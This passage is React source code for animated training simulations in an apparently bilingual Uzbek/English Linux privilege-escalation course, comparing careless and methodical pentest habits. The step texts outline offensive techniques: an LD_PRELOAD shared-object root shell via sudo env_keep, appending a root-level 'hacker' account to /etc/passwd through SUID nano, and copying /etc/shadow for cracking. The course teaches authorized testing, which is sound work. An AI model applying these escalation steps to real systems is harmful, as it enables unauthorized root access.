    {col:AM,uz:"Enumeratsiyasiz to'g'ridan-to'g'ri mashhur exploit'lar sinab ko'riladi",en:"Famous exploits are tried directly, with no enumeration first",duz:"«Balki ishlar» degan taxminga tayaniladi.",den:"Relying on a «maybe it'll work» guess."},
    {col:AM,uz:"10 ta turli kernel exploit sinaldi — birortasi mos kelmadi",en:"10 different kernel exploits are tried — not one matches",duz:"Nishonning haqiqiy yadro versiyasi hech qachon tekshirilmagan edi.",den:"The target's actual kernel version was never checked."},
    {col:D,uz:"😩 2 soat behuda ketdi — oddiy sudo -l hech qachon tekshirilmadi",en:"😩 2 hours wasted — the simple sudo -l was never even checked",duz:"Eng oson vektor butun vaqt davomida ko'rinmay turgan edi.",den:"The easiest vector sat unnoticed the entire time.",final:true,bad:true}
  ];
  const METHODICAL=[
    {col:BL,uz:"Foothold qo'lga kiritildi — xuddi shu www-data foydalanuvchisi",en:"Foothold obtained — the exact same www-data user",duz:"Bir xil boshlang'ich nuqta, boshqacha yondashuv.",den:"The same starting point, a different approach."},
    {col:AM,uz:"Enumeratsiya: sudo -l, SUID, cron, kernel versiyasi — barchasi tizimli tekshiriladi",en:"Enumeration: sudo -l, SUID, cron, kernel version — all checked systematically",duz:"§3 dagi metodologiya bosqichma-bosqich bajariladi.",den:"The §3 methodology is followed step by step."},
    {col:AM,uz:"sudo -l: NOPASSWD: /usr/bin/find topildi — aniq vektor",en:"sudo -l: NOPASSWD: /usr/bin/find is found — a clear vector",duz:"Taxmin emas, kuzatilgan dalilga asoslangan tanlov.",den:"Not a guess — a choice based on observed evidence."},
    {col:A,uz:"✅ 5 daqiqada root — GTFOBins'dagi tayyor texnika qo'llanildi",en:"✅ Root in 5 minutes — a ready GTFOBins technique applied",duz:"Enumeratsiya vaqtni tejaydi, sarflamaydi.",den:"Enumeration saves time, it doesn't cost it.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="random"?RANDOM:METHODICAL;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="random"?RANDOM:run==="methodical"?METHODICAL:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu foothold'dan tasodifiy va metodik yondashuv bilan root'gacha boring.","⬇ Pick a scenario — go from the same foothold to root, with a random versus a methodical approach.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="random"?t(lang,"✗ Tasodifiy: soatlab urinish, natija yo'q","✗ Random: hours of trying, no result"):t(lang,"✓ Metodik: daqiqalarda aniq vektor topildi","✓ Methodical: a clear vector found in minutes")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("random");setStep(-1);},style:{flex:1,padding:"9px",background:run==="random"?D+"22":SL2,color:run==="random"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"😩 Tasodifiy urinish","😩 Random guessing")),
      React.createElement("button",{onClick:()=>{setRun("methodical");setStep(-1);},style:{flex:1,padding:"9px",background:run==="methodical"?A+"22":SL2,color:run==="methodical"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Metodik enumeratsiya","✅ Methodical enumeration"))));
}

function ThoroughEnumSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const QUICK=[
    {col:BL,uz:"id — uid=1000(alper) gid=1000(alper) — «oddiy foydalanuvchiman» xulosasi chiqariladi",en:"id — uid=1000(alper) gid=1000(alper) — concludes «I'm just a normal user»",duz:"Bitta buyruq, bitta xulosa — shu yerda to'xtaladi.",den:"One command, one conclusion — and it stops there."},
    {col:AM,uz:"Boshqa hech qanday buyruq ishga tushirilmaydi — «bu yerda hech narsa yo'q» deb qaror qilinadi",en:"No other command is run — a decision is made that «there's nothing here»",duz:"Xulosa dalilga emas, taxminga asoslangan.",den:"The conclusion rests on assumption, not evidence."},
    {col:AM,uz:"history, /etc/passwd, netstat, find — birortasi ham tekshirilmadi",en:"history, /etc/passwd, netstat, find — not one of them gets checked",duz:"§2-§7 dagi barcha usullar sinab ko'rilmasdan qoladi.",den:"Every technique from §2-§7 goes untried."},
    {col:D,uz:"❌ .secret.txt fayli va tinglovchi port hech qachon topilmadi",en:"❌ The .secret.txt file and the listening port are never found",duz:"Ular yashiringan emas edi — shunchaki qidirilmadi.",den:"They weren't hidden — they simply weren't looked for.",final:true,bad:true}
  ];
  const THOROUGH=[
    {col:BL,uz:"id — xuddi shu natija, lekin bu FAQAT boshlang'ich nuqta deb qaraladi",en:"id — the exact same result, but it's treated as ONLY the starting point",duz:"Xuddi shu buyruq — farq shundan keyin nima qilinishida.",den:"The exact same command — the difference is what happens next."},
    {col:AM,uz:"ls -la, cat /etc/passwd, netstat -ano, find / -perm -u=s — barchasi navbat bilan bajariladi",en:"ls -la, cat /etc/passwd, netstat -ano, find / -perm -u=s — all run in turn",duz:"§2-§7 dagi har bir texnika sinaladi, hech biri o'tkazib yuborilmaydi.",den:"Every technique from §2-§7 gets tried, none skipped."},
    {col:AM,uz:"ls -la: .secret.txt topildi; netstat: ichki port 1337 tinglanmoqda",en:"ls -la: .secret.txt is found; netstat: internal port 1337 is listening",duz:"Ikkalasi ham oddiy ls yoki id bilan hech qachon ko'rinmagan bo'lardi.",den:"Neither would ever have shown up with a plain ls or id."},
    {col:A,uz:"✅ Ikkita yangi ipuchi qo'lga kiritildi — keyingi qadam uchun aniq yo'nalish bor",en:"✅ Two new leads are in hand — a clear direction for the next step",duz:"«Qanchalik ko'p bilsangiz, imtiyozlarni oshirish yo'lini shunchalik oson topasiz» — §1.",den:"«The more you know, the easier you find a privesc path» — §1.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="quick"?QUICK:THOROUGH;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="quick"?QUICK:run==="thorough"?THOROUGH:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu foothold'ni tezkor va puxta enumeratsiya bilan solishtiring.","⬇ Pick a scenario — compare the same foothold under a quick check versus thorough enumeration.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="quick"?t(lang,"✗ Tezkor: hech narsa topilmadi, chunki hech narsa qidirilmadi","✗ Quick: nothing was found because nothing was searched for"):t(lang,"✓ Puxta: yashiringan ipuchlar ochildi","✓ Thorough: hidden leads were uncovered")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("quick");setStep(-1);},style:{flex:1,padding:"9px",background:run==="quick"?D+"22":SL2,color:run==="quick"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Tezkor (id bilan to'xtash)","❌ Quick (stop at id)")),
      React.createElement("button",{onClick:()=>{setRun("thorough");setStep(-1);},style:{flex:1,padding:"9px",background:run==="thorough"?A+"22":SL2,color:run==="thorough"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Puxta (hammasini tekshirish)","✅ Thorough (check everything)"))));
}

function AutoToolVerifySim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const SINGLE=[
    {col:BL,uz:"LinPEAS ishga tushiriladi — natija: hech qanday qizil (yuqori xavf) topilma yo'q",en:"LinPEAS is run — result: no red (high-risk) findings at all",duz:"Chiqish uzun, lekin hech narsa alohida ajralib turmaydi.",den:"The output is long, but nothing stands out."},
    {col:AM,uz:"Xulosa: «tizim toza» deb qaror qilinadi, boshqa vosita sinalmaydi",en:"Conclusion: the system is judged «clean», no other tool is tried",duz:"Bitta vosita — bitta nuqtai nazar.",den:"One tool — one point of view."},
    {col:AM,uz:"Aslida: nishonda Python yo'q edi — LinPEAS'ning ba'zi tekshiruvlari sukut saqladi",en:"In reality: Python wasn't on the target — some of LinPEAS's checks stayed silent",duz:"Vosita ishlamadi emas — faqat ba'zi qismlari sukut saqladi, buni sezish qiyin.",den:"The tool didn't fail outright — some parts just went quiet, hard to notice.",final:false},
    {col:D,uz:"❌ Haqiqiy vektor (yoziladigan cron skripti) sezilmay qoldi — soxta salbiy",en:"❌ The real vector (a writable cron script) went unnoticed — a false negative",duz:"§4 dagi InfoBox aynan shu haqida ogohlantiradi.",den:"The §4 InfoBox warns about exactly this.",final:true,bad:true}
  ];
  const CROSS=[
    {col:BL,uz:"LinPEAS ishga tushiriladi — xuddi shu «toza» natija chiqadi",en:"LinPEAS is run — the exact same «clean» result comes out",duz:"Birinchi qadam ikkala ssenariyda ham bir xil.",den:"The first step is identical in both scenarios."},
    {col:AM,uz:"Qoidaga ko'ra ikkinchi vosita ham sinaladi: LinEnum (bash asosida, Python'ga bog'liq emas)",en:"As a rule, a second tool is also tried: LinEnum (bash-based, no Python dependency)",duz:"§3 dagi «bir nechtasini bilib oling» maslahatiga amal qilinadi.",den:"Following §3's advice to know several tools."},
    {col:AM,uz:"LinEnum: /etc/crontab'da yoziladigan skriptni topadi va sariq rangda belgilaydi",en:"LinEnum: finds the writable script in /etc/crontab and flags it in yellow",duz:"LinPEAS o'tkazib yuborgan aynan shu vektor.",den:"Exactly the vector LinPEAS missed."},
    {col:A,uz:"✅ Ikki vosita bir-birini to'ldirdi — haqiqiy vektor qo'lga kiritildi",en:"✅ The two tools complemented each other — the real vector was caught",duz:"Hech bir vosita mukammal emas, lekin ikkitasi birga ko'proq narsani qamrab oladi.",den:"No tool is perfect, but two together cover much more ground.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="single"?SINGLE:CROSS;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="single"?SINGLE:run==="cross"?CROSS:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu nishonni bitta vosita va ikkinchi vosita bilan tekshirib solishtiring.","⬇ Pick a scenario — check the same target with one tool versus a second cross-check tool.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="single"?t(lang,"✗ Bitta vosita: soxta salbiy yashirin qoldi","✗ One tool: a false negative stayed hidden"):t(lang,"✓ Ikki vosita: bir-birini to'ldirib, vektor topildi","✓ Two tools: complemented each other and caught the vector")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("single");setStep(-1);},style:{flex:1,padding:"9px",background:run==="single"?D+"22":SL2,color:run==="single"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"❌ Bitta vositaga ishonish","❌ Trust one tool")),
      React.createElement("button",{onClick:()=>{setRun("cross");setStep(-1);},style:{flex:1,padding:"9px",background:run==="cross"?A+"22":SL2,color:run==="cross"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ikkinchi vosita bilan tekshirish","✅ Cross-check with a second tool"))));
}

function KernelExploitRiskSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const RECKLESS=[
    {col:BL,uz:"uname -r → 3.13.0-24-generic — mos exploit topildi, darhol yuklab ishga tushiriladi",en:"uname -r → 3.13.0-24-generic — a matching exploit found, downloaded and run immediately",duz:"Versiya to'g'ri topildi — muammo shu yerdan boshlanmaydi.",den:"The version is found correctly — the problem doesn't start here."},
    {col:AM,uz:"Exploit kodi o'qilmadi — «nomiga qarab ishonch bildirildi»",en:"The exploit code isn't read — «trusted by name alone»",duz:"L23 dagi ogohlantirish bu yerda ham amal qiladi.",den:"The L23 warning applies here too."},
    {col:AM,uz:"Exploit yadro xotirasida beqaror holat yaratadi — bu MIJOZNING PRODUKSIYA serveri",en:"The exploit creates an unstable kernel state — this is the CLIENT'S PRODUCTION server",duz:"Kernel exploitlar, ishlamasa ham, yadro holatini buzishi mumkin.",den:"Kernel exploits can corrupt kernel state even when they don't fully succeed."},
    {col:D,uz:"💥 Server qulab tushdi — mijozning jonli xizmati soatlab to'xtab qoldi",en:"💥 The server crashes — the client's live service is down for hours",duz:"Root olish o'rniga, endi tiklash (recovery) suhbati boshlanadi.",den:"Instead of gaining root, now a recovery conversation begins.",final:true,bad:true}
  ];
  const CAREFUL=[
    {col:BL,uz:"uname -r → xuddi shu 3.13.0-24-generic — mos exploit topildi",en:"uname -r → the exact same 3.13.0-24-generic — a matching exploit found",duz:"Bir xil boshlang'ich nuqta, boshqacha davomi.",den:"The same starting point, a different continuation."},
    {col:AM,uz:"Exploit kodi avval o'qiladi — nima o'zgartirishi va qanday ishlashi tushuniladi",en:"The exploit code is read first — what it changes and how it works is understood",duz:"§4 dagi «ishga tushirishdan OLDIN tushuning» maslahatiga amal qilinadi.",den:"Following §4's advice to understand it BEFORE running it."},
    {col:AM,uz:"Avval bir xil versiyali alohida test VM'da sinaladi — muvaffaqiyatli, vaqtincha sekinlashuv bilan",en:"It's first tested on a separate VM with the identical version — succeeds, with a brief slowdown",duz:"Haqiqiy nishonga tegishdan oldin xavf o'lchab ko'riladi.",den:"The risk is measured before ever touching the real target."},
    {col:A,uz:"✅ Mijoz bilan xavf muhokama qilingach, nazorat ostida ishga tushiriladi — root, uzilish yo'q",en:"✅ Run under control after discussing the risk with the client — root, no downtime",duz:"Xuddi shu exploit, xuddi shu natija — lekin boshqariladigan tarzda.",den:"The exact same exploit, the exact same result — but delivered under control.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="reckless"?RECKLESS:CAREFUL;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="reckless"?RECKLESS:run==="careful"?CAREFUL:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu kernel exploit'ni beparvo va ehtiyotkor tarzda ishga tushirishni solishtiring.","⬇ Pick a scenario — compare running the exact same kernel exploit recklessly versus carefully.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="reckless"?t(lang,"✗ Beparvo: root o'rniga qulash","✗ Reckless: a crash instead of root"):t(lang,"✓ Ehtiyotkor: root, xizmat buzilmadi","✓ Careful: root, no service disruption")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("reckless");setStep(-1);},style:{flex:1,padding:"9px",background:run==="reckless"?D+"22":SL2,color:run==="reckless"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"💥 Beparvo (sinovsiz)","💥 Reckless (untested)")),
      React.createElement("button",{onClick:()=>{setRun("careful");setStep(-1);},style:{flex:1,padding:"9px",background:run==="careful"?A+"22":SL2,color:run==="careful"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"✅ Ehtiyotkor (avval sinash)","✅ Careful (test first)"))));
}

function EnvKeepSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const STRIPPED=[
    {col:BL,uz:"sudo -l — env_keep ro'yxatida LD_PRELOAD YO'Q (standart, xavfsiz sozlama)",en:"sudo -l — LD_PRELOAD is NOT in env_keep (the default, safe configuration)",duz:"Zamonaviy sudo sukut bo'yicha ko'p muhit o'zgaruvchisini tozalaydi.",den:"Modern sudo strips most environment variables by default."},
    {col:AM,uz:"sudo LD_PRELOAD=/tmp/shell.so find — buyruq yuboriladi",en:"sudo LD_PRELOAD=/tmp/shell.so find — the command is sent",duz:"Hujumchi tomonidan hech narsa boshqacha qilinmaydi.",den:"The attacker does nothing differently."},
    {col:AM,uz:"sudo LD_PRELOAD o'zgaruvchisini avtomatik TOZALAYDI — dasturga hech qachon yetib bormaydi",en:"sudo automatically STRIPS the LD_PRELOAD variable — it never reaches the program",duz:"find LD_PRELOAD degan narsa borligini bilmasdan ishga tushadi.",den:"find runs without ever knowing LD_PRELOAD existed."},
    {col:A,uz:"🔒 shell.so hech qachon yuklanmadi — vektor ishlamaydi",en:"🔒 shell.so never gets loaded — the vector doesn't work",duz:"Bitta sozlama qatori butun hujum texnikasini bekor qiladi.",den:"One config line neutralizes the entire attack technique.",final:true}
  ];
  const PRESERVED=[
    {col:BL,uz:"sudo -l — env_keep+=LD_PRELOAD RO'YXATDA BOR (xavfli sozlama)",en:"sudo -l — LD_PRELOAD IS listed in env_keep (a risky configuration)",duz:"Ehtimol muayyan dastur uchun atayin qo'yilgan va unutilgan.",den:"Probably set deliberately for some program and never removed."},
    {col:AM,uz:"sudo LD_PRELOAD=/tmp/shell.so find — xuddi shu buyruq yuboriladi",en:"sudo LD_PRELOAD=/tmp/shell.so find — the exact same command is sent",duz:"Bir xil urinish, boshqacha sozlama.",den:"The same attempt, a different configuration."},
    {col:AM,uz:"sudo o'zgaruvchini SAQLAYDI va dasturga uzatadi",en:"sudo PRESERVES the variable and passes it through to the program",duz:"env_keep aynan shu — «bu o'zgaruvchini tozalama» degan buyruq.",den:"That's exactly what env_keep means: «don't strip this variable»."},
    {col:D,uz:"☠ shell.so yuklanadi, root shell ochiladi",en:"☠ shell.so loads, a root shell opens",duz:"Bitta sozlama qatori butun himoyani ochib qo'yadi.",den:"One config line throws the entire defense wide open.",final:true,bad:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="stripped"?STRIPPED:PRESERVED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="stripped"?STRIPPED:run==="preserved"?PRESERVED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu LD_PRELOAD urinishini ikki env_keep sozlamasida sinang.","⬇ Pick a scenario — try the exact same LD_PRELOAD attempt under two env_keep configurations.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="stripped"?t(lang,"✓ Tozalangan: vektor ishlamaydi","✓ Stripped: the vector doesn't work"):t(lang,"✗ Saqlangan: root shell ochiladi","✗ Preserved: a root shell opens")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("stripped");setStep(-1);},style:{flex:1,padding:"9px",background:run==="stripped"?A+"22":SL2,color:run==="stripped"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔒 env_keep'da LD_PRELOAD yo'q","🔒 LD_PRELOAD not in env_keep")),
      React.createElement("button",{onClick:()=>{setRun("preserved");setStep(-1);},style:{flex:1,padding:"9px",background:run==="preserved"?D+"22":SL2,color:run==="preserved"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"☠ env_keep+=LD_PRELOAD bor","☠ env_keep+=LD_PRELOAD set"))));
}

function SUIDPathSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const CRACK=[
    {col:BL,uz:"SUID nano orqali /etc/shadow va /etc/passwd nusxalanadi",en:"/etc/shadow and /etc/passwd are copied via SUID nano",duz:"Xuddi shu boshlang'ich imkoniyat — SUID nano orqali istalgan faylni o'qish.",den:"The same starting capability — reading any file via SUID nano."},
    {col:AM,uz:"unshadow bilan birlashtiriladi, John the Ripper ishga tushiriladi",en:"unshadow merges them, John the Ripper is launched",duz:"Endi tashqi omilga — parol kuchiga — bog'liq bosqich boshlanadi.",den:"Now a stage begins that depends on an outside factor: password strength."},
    {col:AM,uz:"Parol kuchli bo'lsa — soatlab yoki hech qachon buzilmasligi mumkin",en:"If the password is strong, it may take hours — or never crack at all",duz:"Bu yo'l root egasining parol tanlovi natijasiga qaram.",den:"This path's outcome depends on how the root owner chose their password."},
    {col:D,uz:"⏳ Natija kafolatlanmagan — parol kuchiga bog'liq",en:"⏳ Not guaranteed — the outcome hinges on password strength",duz:"Ishlashi mumkin, lekin vaqt va muvaffaqiyat kafolatlanmagan.",den:"It might work, but neither time nor success is guaranteed.",final:true,bad:true}
  ];
  const DIRECT=[
    {col:BL,uz:"SUID nano orqali /etc/passwd tahrirlash uchun ochiladi",en:"/etc/passwd is opened for editing via SUID nano",duz:"Xuddi shu boshlang'ich imkoniyat, boshqacha maqsad.",den:"The same starting capability, a different goal."},
    {col:AM,uz:"openssl passwd bilan yangi xesh yaratilib, hacker:...:0:0:root qatori qo'shiladi",en:"openssl passwd generates a new hash, and a hacker:...:0:0:root line is appended",duz:"Mavjud parolni buzish emas — o'zimizning yangi hisobimizni yaratamiz.",den:"Not cracking an existing password — creating our own new account."},
    {col:AM,uz:"su hacker — darhol yangi hisobga o'tiladi",en:"su hacker — immediately switches to the new account",duz:"Hech qanday tashqi omilga bog'liq emas — hammasi bizning nazoratimizda.",den:"Nothing depends on an outside factor — it's all under our control."},
    {col:A,uz:"⚡ Bir necha soniyada root — buzish yoki kutish shart emas",en:"⚡ Root in a few seconds — no cracking or waiting required",duz:"Xuddi shu SUID nano imkoniyati — deterministik natija.",den:"The exact same SUID nano capability — a deterministic result.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="crack"?CRACK:DIRECT;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="crack"?CRACK:run==="direct"?DIRECT:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu SUID nano imkoniyatidan ikki xil yo'l bilan foydalaning.","⬇ Pick a scenario — use the exact same SUID nano capability two different ways.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="crack"?t(lang,"✗ Variant 1: sekin va natija kafolatlanmagan","✗ Variant 1: slow and not guaranteed"):t(lang,"✓ Variant 2: tez va aniq natija","✓ Variant 2: fast and certain")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("crack");setStep(-1);},style:{flex:1,padding:"9px",background:run==="crack"?D+"22":SL2,color:run==="crack"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🐌 Variant 1: xesh buzish","🐌 Variant 1: crack the hash")),
      React.createElement("button",{onClick:()=>{setRun("direct");setStep(-1);},style:{flex:1,padding:"9px",background:run==="direct"?A+"22":SL2,color:run==="direct"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Variant 2: foydalanuvchi qo'shish","⚡ Variant 2: add a user"))));
}

